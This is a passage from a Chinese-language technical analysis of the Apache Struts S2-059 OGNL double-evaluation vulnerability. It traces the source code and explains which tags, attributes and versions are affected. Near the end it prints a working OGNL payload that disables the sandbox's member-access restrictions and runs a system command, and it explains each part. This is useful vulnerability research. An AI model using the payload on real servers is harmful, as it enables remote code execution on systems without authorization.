    public void setTemplateDir(String templateDir) {
        this.templateDir = templateDir;
    }
    ...
    @StrutsTagAttribute(
        description = "Icon path used for image that will have the tooltip"
    )
    public void setTooltipIconPath(String tooltipIconPath) {
        this.tooltipIconPath = tooltipIconPath;
    }
跟进`setId()`方法，会有一个`findString()`方法，这里也就解释了为什么是`id`属性进行解析了。
如果`id`不为空，那么给`id`赋值用户传入的值。接着跟入`findString()`。
跟进`findValue()`方法，我们来看看赋值过程。
如果`altSyntax`功能开启（此功能在`S2-001`的修复方案是将其默认关闭），`altSyntax`这个功能是将标签内的内容当作`OGNL`表达式解析，关闭了之后标签内的内容就不会当作`OGNL`表达式解析了。执行到`TextParseUtil.translateVariables('%',
expr,
this.stack)`，然后在下面执行`OGNL`的表达式的解析，返回传入`action`的参数`%{1+4}`，这里进行了一次表达式的解析。也就是对属性的初始化赋值操作。
`translateVariables()`函数传过来的`open`参数的值是`'%'`，在截取的时候是截取的
`open`之后的字符串，并把传入`stack.OgnlValueStack`，这也是我们的`poc`构造的时候要写成`%{*}`形式的原因。
跟到`com.opensymphony.xwork2.util.TextParseUtil.class`中的`translateVariables()`方法。
在`translateVariables()`方法`while`循环里加了一个`maxLoopCount`参数来限制递归解析的次数，`break`跳出循环（这是对S2-001的修复方案）。这里的`maxLoopCount`为1。
    while(true) {
        int start = expression.indexOf(lookupChars, pos);
        if (start == -1) {
            ++loopCount;
            start = expression.indexOf(lookupChars);
        }
        if (loopCount > maxLoopCount) {    //设置maxLoopCount参数，break跳出循环。
            break;
        }
接着往下跟，跟进`evaluate()`方法。
最终在`com.opensymphonny.xwork2.util:57`完成第一次赋值。这里只进行了一次表达式的解析，返回给action传入的参数是%{1+4}，并未解析成功表达式。
所以我们回到`ComponentTagSupport.class`类`doStartTag()`方法，再跟一下标签对象的`start()`方法，这里会进行`id`值的二次解析。
这里调用了父类`ClosingUIBean`的`start()`方法
跟到父类`org.apache.struts2.components.ClosingUIBean.class`，我们看一下`evaluateParams()`方法。
`org.apache.struts2.components.UIBean.class`的`evaluateParams()`方法中有很多属性使用`findString()`来获取值。
    ...
    if (this.name != null) {
        name = this.findString(this.name);
        this.addParameter("name", name);
    }
    if (this.label != null) {
        this.addParameter("label", this.findString(this.label));
    } else if (providedLabel != null) {
        this.addParameter("label", providedLabel);
    }
    ...
    if (this.onmouseout != null) {
        this.addParameter("onmouseout", this.findString(this.onmouseout));
    }
但是除了`id`解析两次`OGNL`外，算上前面的`setId()`解析了一次，所以这里边的其他属性都仅解析了一次。
最终跟进`populateComponentHtmlId()`方法
再跟进`findStringIfAltSyntax()`方法。
在开启了`altSyntax`功能的前提下，可以看到这里对`id`属性再次进行了表达式的解析。
进入到`findString()`后，就跟前面流程一样了。这也是解释了这次漏洞是由于标签属性值进行二次表达式解析产生的。
跟进`findvalue()`
`org.apache.struts2.components.Component.class`的`findStringIfAltSyntax()`，与前面一样又会执行一次`TextParseUtil.translateVariables()`方法。
跟进`com.opensymphony.xwork2.util.TextParseUtil.class:63`的`return
parser.evaluate(openChars, expression, ognlEval, maxLoopCount)`
这里可以看到表达式内容已经解析执行了。
## 思考
如果表达式中的值可控，那么就有可能传入危险的表达式实现远程代码执行，但是这个漏洞利用前提条件是`altSyntax`功能开启且需要特定标签`id`属性（暂未找到其他可行属性）存在表达式`%{payload}`且`payload`可控且不需要进行框架的安全校验。利用条件较为苛刻，需要结合应用程序的代码实现，所以无法进行大规模的利用。
我们知道此次`S2-059`与之前的`S2-029`和`S2-036`类似都是`OGNL`表达式的二次解析而产生的漏洞，用`S2-029`的poc打不了`S2-059`搭建的环境。
与`S2-029`的区别：`S2-029`是标签的`name`属性出现了问题，由于`name`属性调用了`org.apache.struts2.components.Component.class`的`completeExpressionIfAltSyntax()`方法，会自动加上`"%{}"`这也就解释了`S2-029`的`payload`不用加`%{}`的原因。
    protected String completeExpressionIfAltSyntax(String expr) {
        return this.altSyntax() ? "%{" + expr + "}" : expr;
    }
关于受影响标签：
继承`AbstractUITag`类的标签都会受到影响。当这些标签存在`id`属性时，会调用父类`AbstractUITag.populateParams()`方法，触发`setId()`解析一次`OGNL`表达式。比如`label`标签（同样输入表达式`%{1+4}`）。
这里可以看到`LabelTag.class`继承了`AbstractUITag.class`
关于版本问题：
官方说明影响范围是Apache Struts 2.0.0 – 2.5.20，这里测试了2.1.1和2.3.24版本。
不同的版本对于沙盒的绕过不同，所用的到的poc绕过也就有出入，再高版本2.5.16之后的沙盒目前没有公开绕过方法。我测试了稍低版本`Struts
2.2.1`与稍高版本`Struts 2.3.24`，均可以控制输入值。
关于回显：
    %{#_memberAccess.allowPrivateAccess=true,#_memberAccess.allowStaticMethodAccess=true,#_memberAccess.excludedClasses=#_memberAccess.acceptProperties,#_memberAccess.excludedPackageNamePatterns=#_memberAccess.acceptProperties,#res=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=@java.lang.Runtime@getRuntime(),#s=new java.util.Scanner(#a.exec('ls -al').getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#res.print(#str),#res.close()
    }
`OgnlContext`的`_memberAccess`变量进行了访问控制限制，决定了用哪些类，哪些包，哪些方法可以被`OGNL`表达式所使用。
所以其中poc中需要设置`#_memberAccess.allowPrivateAccess=true`用来授权访问`private`方法，`#_memberAccess.allowStaticMethodAccess=true`用来授权允许调用静态方法，
`#_memberAccess.excludedClasses=#_memberAccess.acceptProperties`用来将受限的类名设置为空
`#_memberAccess.excludedPackageNamePatterns=#_memberAccess.acceptProperties`用来将受限的包名设置为空
`#res=[@org](https://github.com/org
"@org").apache.struts2.ServletActionContext[@getResponse](https://github.com/getResponse
"@getResponse")().getWriter()`返回`HttpServletResponse`实例获取`respons`对象并回显。
`#a=[@java](https://github.com/java
"@java").lang.Runtime[@getRuntime](https://github.com/getRuntime
"@getRuntime")(),#s=new java.util.Scanner(#a.exec('ls
-al').getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#res.print(#str),#res.close()`执行系统命令，使用`java.util.Scanner`一个文本扫描器，执行命令`ls
-al`，将目录下的内容回显出来。
至于为什么加`%{}`，在之前的分析中已经提及。
## 参考
  * 
  * 
  * 
  * 
  * 